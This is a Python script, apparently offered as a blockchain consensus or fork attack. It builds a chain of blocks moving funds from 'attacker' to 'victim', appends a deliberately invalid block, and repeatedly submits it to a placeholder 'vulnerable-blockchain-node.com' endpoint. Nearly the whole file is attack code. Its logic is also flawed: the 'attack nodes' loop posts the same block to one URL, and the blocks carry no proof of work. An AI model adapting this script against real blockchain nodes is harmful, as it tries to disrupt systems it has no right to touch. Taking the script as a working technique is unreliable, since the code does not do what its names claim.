import random
import hashlib
import json
import requests
from datetime import datetime

# Configuration
TARGET_API = 'http://vulnerable-blockchain-node.com'
NUM_ATTACK_NODES = 10
FORK_DEPTH = 10
GENESIS_BLOCK = {
    'index': 0,
    'previous_hash': '0',
    'timestamp': datetime.utcnow().isoformat(),
    'transactions': [],
    'nonce': 100
}

# Generate a block
def create_block(previous_block, transactions):
    index = previous_block['index'] + 1
    timestamp = datetime.utcnow().isoformat()
    nonce = random.randint(0, 1000000)
    block = {
        'index': index,
        'previous_hash': hashlib.sha256(json.dumps(previous_block, sort_keys=True).encode()).hexdigest(),
        'timestamp': timestamp,
        'transactions': transactions,
        'nonce': nonce
    }
    block['hash'] = hashlib.sha256(json.dumps(block, sort_keys=True).encode()).hexdigest()
    return block

# Create a chain with valid and invalid blocks to test node behavior
def create_forked_chain():
    chain = [GENESIS_BLOCK]
    
    for _ in range(FORK_DEPTH):
        transactions = [{'sender': 'attacker', 'recipient': 'victim', 'amount': random.randint(1, 100)}]
        new_block = create_block(chain[-1], transactions)
        chain.append(new_block)
    
    # Optionally add an invalid block to simulate a malicious fork
    invalid_block = {
        'index': chain[-1]['index'] + 1,
        'previous_hash': 'invalid_hash',  # Incorrect hash to simulate an invalid block
        'timestamp': datetime.utcnow().isoformat(),
        'transactions': [{'sender': 'attacker', 'recipient': 'victim', 'amount': random.randint(1, 100)}],
        'nonce': random.randint(0, 1000000),
        'hash': 'invalid_hash'  # Incorrect hash to simulate an invalid block
    }
    chain.append(invalid_block)
    
    return chain

# Simulate the attack by creating a forked blockchain
def consensus_attack():
    chain = create_forked_chain()
    
    # Step 3: Attempt to propagate the forked chain to attack nodes
    for i in range(NUM_ATTACK_NODES):
        response = requests.post(f'{TARGET_API}/submit_block', json=chain[-1])
        if response.status_code == 200:
            print(f"Node {i+1}: Block accepted")
        else:
            print(f"Node {i+1}: Block rejected")

if __name__ == "__main__":
    consensus_attack()
